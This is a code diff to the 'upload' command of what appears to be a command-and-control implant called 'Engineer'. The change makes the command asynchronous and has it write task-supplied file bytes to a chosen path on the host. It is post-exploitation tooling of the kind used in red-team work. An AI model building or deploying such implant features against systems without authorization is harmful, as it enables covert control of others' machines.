@@ -1,4 +1,5 @@
 ﻿using Engineer.Commands;
+using Engineer.Functions;
 using Engineer.Models;
 using System;
 using System.Collections.Generic;
@@ -13,28 +14,27 @@ namespace Engineer.Commands
     {
         public override string Name => "upload";
 
-        public override string Execute(EngineerTask task)
+        public override async Task Execute(EngineerTask task)
         {
             try
             {
-                task.Arguments.TryGetValue("/content", out string contentb64);
                 task.Arguments.TryGetValue("/dest", out string destination);
 
-                if (string.IsNullOrWhiteSpace(contentb64))
-                {
-                    return "error: " + "Missing file content";
-                }
                 if (string.IsNullOrWhiteSpace(destination))
                 {
                     destination = Environment.CurrentDirectory;
                 }
-                var contentbytes = Convert.FromBase64String(contentb64);
+                var contentbytes = task.File;
+                if(contentbytes.Length == 0)
+                {
+                    Tasking.FillTaskResults("Error: Missing file content to upload", task, EngTaskStatus.FailedWithWarnings);
+                }
                 File.WriteAllBytes(destination, contentbytes);
-                return "file uploaded at " + destination;
+                Tasking.FillTaskResults("file uploaded at " + destination, task, EngTaskStatus.Complete);
             }
             catch (Exception ex)
             {
-                return "error: " + ex.Message;
+                Tasking.FillTaskResults("error: " + ex.Message, task, EngTaskStatus.Failed);
             }
         }
     }
